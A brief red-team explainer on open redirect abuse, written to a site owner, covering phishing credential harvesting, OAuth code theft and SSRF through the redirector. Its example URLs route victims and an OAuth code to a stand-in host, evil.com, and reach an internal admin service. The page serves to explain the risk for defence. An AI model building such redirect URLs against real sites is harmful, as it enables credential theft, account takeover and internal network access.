# Red Team: Open Redirect Exploitation

---

## Attack 1: Credential Harvesting

1. Send email: "Verify your account: https://yoursite.com/redirect?to=https://evil.com/login"
2. User clicks, sees your domain initially
3. Redirected to fake login page (looks like yours)
4. User enters credentials
5. Attacker forwards to real site (seamless)

**Impact:** Stolen credentials, account takeover.

---

## Attack 2: OAuth Token Theft

1. OAuth flow redirects to: `https://yoursite.com/callback?code=abc123`
2. Attacker sends: `https://yoursite.com/redirect?to=https://evil.com?code=abc123`
3. Your redirector sends the OAuth code to the attacker

**Impact:** OAuth token compromise, account takeover.

---

## Attack 3: SSRF via Redirect

1. Your internal service follows redirects
2. Attacker sends: `https://yoursite.com/redirect?to=http://internal-service/admin`
3. Your server makes request to internal service
4. Attacker accesses internal APIs through your redirector

**Impact:** Internal network access, data breach.
